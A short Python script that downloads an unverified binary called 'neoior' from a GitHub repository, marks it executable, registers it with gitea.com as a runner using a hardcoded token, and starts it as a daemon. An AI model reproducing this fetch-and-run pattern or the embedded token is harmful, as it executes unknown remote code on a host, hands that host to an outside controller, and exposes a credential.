import subprocess
import urllib.request
import os

TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"

URL = "https://github.com/hamcolio/symmetrical-invention/raw/refs/heads/main/neoior"
BINARY = "neoior"

print("[1] Downloading neoior...")
urllib.request.urlretrieve(URL, BINARY)

os.chmod(BINARY, 0o755)

print("[2] Registering runner...")
subprocess.run([
    "./neoior",
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "maiso",
    "--name", "maiso"
], check=True)

print("[3] Starting daemon...")
subprocess.run(["./neoior", "daemon"], check=True)
